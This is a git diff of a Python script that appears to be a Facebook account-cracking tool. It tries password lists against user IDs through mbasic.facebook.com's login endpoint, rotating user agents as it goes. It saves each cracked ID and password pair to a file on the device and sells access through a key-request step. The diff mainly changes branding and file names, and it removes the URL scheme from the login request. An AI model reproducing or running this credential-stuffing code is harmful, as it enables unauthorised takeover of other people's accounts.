@@ -131,8 +131,7 @@ logo=("""
 \033[32;1m ████  ████ ██   ██          ██ ██ ██   ██ ██    ██ ████   ██ 
 \033[33;1m ██ ████ ██ ██████           ██ ██ ██████  ██    ██ ██ ██  ██ 
 \033[32;1m ██  ██  ██ ██   ██     ██   ██ ██ ██   ██ ██    ██ ██  ██ ██ 
-\033[33;1m ██      ██ ██   ██      █████  ██ ██████   ██████  ██   ████                                                                                                                                                                                                                                                  
-
+\033[33;1m ██      ██ ██   ██      █████  ██ ██████   ██████  ██   ████                                                                                  
 ┌───────────────────────────────────────┐
 │ [✓] AUTHOR   : MRX JIBON            
 │ [✓] LIKE    :                
@@ -242,7 +241,8 @@ def virusA():
 	print(' [✓] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
-def a(uid,pwx,tl):
+
+def b(uid,pwx,tl):
     global loop
     global cps    
     global oks
@@ -250,7 +250,7 @@ def a(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMRX JIBON X ZAHIRUL\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[ JIBON-XD ]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -285,8 +285,7 @@ def a(uid,pwx,tl):
             'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1',
             "user-agent": pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -294,7 +293,7 @@ def a(uid,pwx,tl):
                 print(f'\r\33[1;92m [JIBON-OK] '+cid+' | '+ps+'\33[0;92m')
                 #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/jibon-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/JIBON-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -303,7 +302,7 @@ def a(uid,pwx,tl):
 
         pass
 def superuser():
-    UMO="JIBON-"
+    UMO="HRIDOYE-"
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
@@ -326,11 +325,11 @@ def superuser():
         print ("")
         print (" Your Key : "+UMO+id)
         print ("\n")
-        os.system("espeak \"assalamualaikum ,I am JIBON VAI er  ROBOT and my boss is Jibon.Sir this tool is paid because 100% ok id just now login\"")
+        os.system("espeak \"assalamualaikum ,I am MRX JIBON VAI er  ROBOT and my boss is JIBON.Sir this tool is paid because 100% ok id just now login\"")
         name = input(" Your Name : ")
         os.system(f"espeak \"{name} ,prass Enter to send your key\"")
         print ("")
         input(" Press Enter To Send Key")
-        os.system("xdg-open https://wa.me/+8801846738727")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100000360144702&mibextid=ZbWKwL")
         superuser()        
 superuser()
